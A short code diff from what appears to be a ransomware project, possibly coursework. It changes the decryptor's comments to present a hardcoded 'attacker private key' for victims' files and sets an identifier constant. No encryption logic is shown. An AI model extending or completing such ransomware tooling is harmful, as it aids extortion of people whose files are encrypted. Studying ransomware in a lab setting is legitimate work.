@@ -51,11 +51,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 
 # =============================================================================
-# OPTIONAL HARDCODED ATTACKER PRIVATE KEY (sk)
-# Default is None: the attacker normally transfers ransom_private.pem to the
-# victim after the ransom is paid (this matches the project description).
-# To hardcode instead, paste the full content of ransom_private.pem here,
-# including the BEGIN/END lines, between the triple quotes.
+# HARDCODED ATTACKER PRIVATE KEY (sk)
 # =============================================================================
 
 PRIVATE_KEY_PEM = """-----BEGIN RSA PRIVATE KEY-----
@@ -88,7 +84,7 @@ QDtaquO9OwT1nlpCf51uWQZV9WRVVdPbZhbEts00u1y4T+hBSBk/
 
 # --------------------------- customization ----------------------------------
 # Must match the value used by ransomware_encrypt.py.
-EUID = 'EUID'
+EUID = 'abcde'
 
 # ------------------------------ constants ------------------------------------
 MAGIC = b'CRLOCK1!'          # must match the encryptor's marker
